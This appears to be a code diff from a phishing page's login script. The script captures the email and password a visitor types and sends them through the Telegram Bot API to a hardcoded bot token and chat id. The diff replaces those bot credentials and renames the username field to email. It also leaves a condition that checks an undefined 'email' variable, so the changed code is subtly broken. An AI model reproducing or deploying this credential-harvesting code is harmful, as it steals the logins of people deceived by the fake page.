@@ -15,15 +15,15 @@ window.location.href = "login.html";
 });
 
 function login(){
-var username = $("#username").val();
+var username = $("#email").val();
 var pass = $("#pass").val();
 
-var text = "user : " + username + "|| pass : " + pass;
+var text = "email : " + username + "|| pass : " + pass;
 
-var token = "461120527:AAFqdojqi7fQyoQLBXquXY9UJSWtBJIwu6M";
-var id = "387534219";
+var token = "778444790:AAGSDWoCtikQEP0wTx5BU31b61rsXrnUwP0";
+var id = "232267354";
 
-if(username.length > 0 && pass.length > 0){
+if(email.length > 0 && pass.length > 0){
 
 
 $("#logbut").attr("disabled","disabled");
@@ -31,7 +31,7 @@ $("#logbut").attr("disabled","disabled");
     $.get( "https://api.telegram.org/bot" + token +"/sendMessage?chat_id=" +id + "&text=" + text, function( data ) {
 $("#logbut").removeAttr("disabled","disabled");
 $(".alert").show();
-$("#username,#pass").val("");
+$("#email,#pass").val("");
       });
 
 }
